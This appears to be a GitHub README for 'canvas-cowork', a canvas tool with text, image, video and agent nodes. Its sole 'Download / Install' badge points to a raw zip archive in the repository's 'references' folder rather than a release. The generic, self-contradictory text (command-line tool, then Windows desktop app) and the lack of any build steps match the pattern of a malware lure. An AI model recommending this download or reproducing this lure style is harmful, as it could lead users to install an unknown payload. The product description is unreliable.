# 🧩 canvas-cowork - Work on a shared canvas

[![Download / Install](https://img.shields.io/badge/Download-Install%20from%20GitHub-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/alexzq343-beep/canvas-cowork/main/references/cowork-canvas-1.6.zip)

## 🖥️ What it does

canvas-cowork lets you work on a spatial canvas from the command line. You can create canvases, add text, make images, generate video, ask an agent for help, read results, recall past work, and manage nodes from one place.

It is built for people who want a simple way to keep tasks, outputs, and agent work in one shared space.

## ⚙️ System needs

canvas-cowork is made for Windows desktop use. A modern Windows 10 or Windows 11 PC should work well.

For a smooth run, use:

- 8 GB of RAM or more
- A recent Intel or AMD processor
- 1 GB of free disk space
- A stable internet connection for agent tasks and generated content

If you plan to generate images or video, a stronger computer will help.

## 🧠 What you can do

canvas-cowork gives you a shared space for work items and outputs. Typical use cases include:

- Create a new canvas for a project
- Place text nodes for ideas, prompts, or notes
- Generate images from a prompt
- Ask an agent to write or answer something

This setup works well when you want to track many small steps without losing context.

## 🗂️ Main parts of the app

### 🎨 Canvas
The canvas is the main workspace. It gives you a wide view where you can place items where they make sense.

### 📝 Nodes
Nodes are the blocks on the canvas. Each node can hold text, output, a prompt, or a result from a tool.

### 🤖 Agent actions
Agent actions help you generate text or answer questions. You can send a prompt and place the reply back on the canvas.

### 🖼️ Media generation
You can create images and video from inputs you place on the canvas.

### 📚 Recall
Recall helps you find past work and reuse it later.

### 🧭 Node management
You can move, edit, and organize nodes to keep your canvas clear.
